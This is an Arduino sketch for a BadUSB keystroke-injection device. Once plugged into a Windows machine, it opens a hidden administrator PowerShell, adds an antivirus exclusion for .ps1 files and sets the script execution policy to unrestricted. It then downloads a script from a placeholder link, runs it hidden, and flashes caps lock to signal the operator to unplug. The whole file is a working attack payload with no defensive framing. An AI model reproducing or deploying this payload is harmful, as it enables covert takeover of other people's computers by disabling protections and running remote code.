#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  
  Keyboard.begin();

  delay(2500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  // Start powershell as Admin

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell.exe -windowstyle hidden");

  delay(200);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();

  delay(150);

  typeKey(KEY_RETURN);

  delay(2000);

  //Go to Public Documents directory

  Keyboard.print("cd C:");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Users");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Public");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();
  
  Keyboard.print("Documents");

  typeKey(KEY_RETURN);  

  //Add an exception for .ps1 files in antivirus

  Keyboard.print("Add-MpPreference -ExclusionExtension ps1 -Force");

  typeKey(KEY_RETURN);

  //Disable script blocker

  Keyboard.print("Set-ExecutionPolicy unrestricted -Force");

  typeKey(KEY_RETURN);

  //Download ps1 sript

  Keyboard.print("wget LINK -OutFile script.ps1");

  typeKey(KEY_RETURN);

  delay(3500);

  //Start ps1 script
  
  Keyboard.print("powershell.exe -noexit -windowstyle hidden -file script.ps1");

  typeKey(KEY_RETURN);

  // Make capslock flash to know when you can unplug the BadUSB

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(2000);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
